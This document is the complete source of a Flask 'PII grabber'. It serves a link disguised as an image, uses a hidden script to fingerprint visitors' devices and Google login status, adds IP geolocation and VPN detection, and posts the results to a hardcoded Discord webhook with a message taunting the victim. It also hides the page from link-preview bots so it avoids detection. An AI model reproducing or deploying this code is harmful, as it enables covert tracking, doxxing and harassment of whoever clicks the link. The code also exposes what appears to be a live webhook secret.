import os
import requests
from flask import Flask, request, render_template_string, send_file
import io
from datetime import datetime

app = Flask(__name__)

# TARGET WEBHOOK
WEBHOOK_URL = "https://discord.com/api/webhooks/1499405115294093454/AxyBIBWUojFPEoD1bIsyexLxf8gC8yR4fEDBF8eCNKLtWPFGfXZ3EZ28XdDEQCHlEl51"

@app.route('/view/image_01.png')
def logger():
    ua = request.user_agent.string
    # Bot Shield: Filters out Discord/Telegram preview bots
    if any(x in ua.lower() for x in ["discord", "telegram", "bot", "crawl", "slack"]):
        r = requests.get("https://media1.tenor.com/m/ziNSDDTCyiwAAAAC/discord-trolling.gif")
        return send_file(io.BytesIO(r.content), mimetype='image/gif')

    return render_template_string('''
    <html>
    <body style="background-color: #000; height: 100vh; margin: 0; display: flex; justify-content: center; align-items: center;">
        <div style="color: #111; font-family: monospace; font-size: 10px;">ESTABLISHING ENCRYPTED TUNNEL...</div>
        <script>
            async function capture() {
                // 1. PHYSICAL GYRO & MOTION (The "New Stuff")
                let tiltData = "N/A (Desktop)";
                window.ondeviceorientation = (e) => {
                    if(e.alpha !== null) {
                        tiltData = `A: ${e.alpha.toFixed(0)}° B: ${e.beta.toFixed(0)}° G: ${e.gamma.toFixed(0)}°`;
                    }
                };

                // 2. SOCIAL SESSION CHECK
                const googleImg = new Image();
                googleImg.src = "https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico";
                let googleStatus = await new Promise(r => {
                    googleImg.onload = () => r("Yes ✅");
                    googleImg.onerror = () => r("No ❌");
                    setTimeout(() => r("Timeout ⌛"), 1500);
                });

                // 3. HARDWARE & GPU FORENSICS
                let gpuInfo = "Unknown/None";
                try {
                    const gl = document.createElement('canvas').getContext('webgl');
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_ID);
                } catch(e){}

                let battStatus = {level: "??", charge: "??"};
                try { 
                    const b = await navigator.getBattery(); 
                    battStatus = {level: Math.round(b.level * 100) + "%", charge: b.charging ? "YES 🔌" : "NO 🔋"};
                } catch(e){}

                const payload = {
                    res: screen.width + "x" + screen.height,
                    monitors: window.screen.isExtended ? "Multi-Monitor" : "Single",
                    gpu: gpuInfo,
                    cores: navigator.hardwareConcurrency || "??",
                    ram: navigator.deviceMemory || "??",
                    lang: navigator.language || "??",
                    platform: navigator.platform,
                    tilt: tiltData,
                    batt: battStatus.level,
                    charging: battStatus.charge,
                    google: googleStatus,
                    ua: navigator.userAgent
                };

                fetch('/log-apex-v14', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                }).then(() => {
                    window.location.href = "https://i.imgur.com/BcNs5vF.jpg";
                });
            }
            // Give 500ms for sensors to initialize
            setTimeout(capture, 500);
        </script>
    </body>
    </html>
    ''')

@app.route('/log-apex-v14', methods=['POST'])
def log_apex():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    time_utc = datetime.utcnow().strftime("%H:%M:%S UTC")

    # DEEP NETWORK & GEO INTEL
    c, region, cntry, isp, vpn, net_type = "??", "??", "??", "??", "??", "??"
    try:
        g = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()
        c = g.get('city', '??')
        region = g.get('regionName', '??')
        cntry = g.get('country', '??')
        isp = g.get('isp', '??')
        vpn = "🚨 DETECTED" if g.get('proxy') or g.get('hosting') else "✅ Clean"
        net_type = "RESIDENTIAL" if not g.get('hosting') else "DATACENTER/VPN"
    except: pass

    # THE FORMATTED EMBED (Apex Layout)
    embed_payload = {
        "username": "nexo took ur PII hahahahha loseerrrr",
        "embeds": [{
            "title": "ultimate pii grabber😈",
            "description": f"Ref: `System Default/Private` | Time: `{time_utc}`",
            "color": 0x000000,
            "fields": [
                {"name": "📍 GEOLOCATION", "value": f"**City:** {c}\n**State:** {region}\n**Country:** {cntry}", "inline": True},
                {"name": "📡 NETWORK", "value": f"**ISP:** {isp}\n**VPN:** {vpn}\n**Type:** {net_type}\n**IP:** `{ip}`", "inline": False},
                {"name": "🔋 POWER & SESSION", "value": f"**Battery:** {d['batt']} ({d['charging']})\n**Google Logged In:** {d['google']}", "inline": False},
                {"name": "🧠 DEVICE SPECS", "value": f"**Model:** {d['platform']}\n**GPU:** `{d['gpu']}`\n**Cores:** {d['cores']} Core CPU\n**RAM:** {d['ram']} GB\n**Lang:** {d['lang']}", "inline": False},
                {"name": "📺 DISPLAY & MOTION", "value": f"**Res:** {d['res']}\n**Screens:** {d['monitors']}\n**Gyro Tilt:** `{d['tilt']}`", "inline": False},
                {"name": "🧬 RAW UA", "value": f"```{d['ua']}```", "inline": False}
            ],
            "footer": {"text": "Project 04nexo | v14.0 | UNSTOPPABLE"},
        }]
    }
    requests.post(WEBHOOK_URL, json=embed_payload)
    return "OK", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
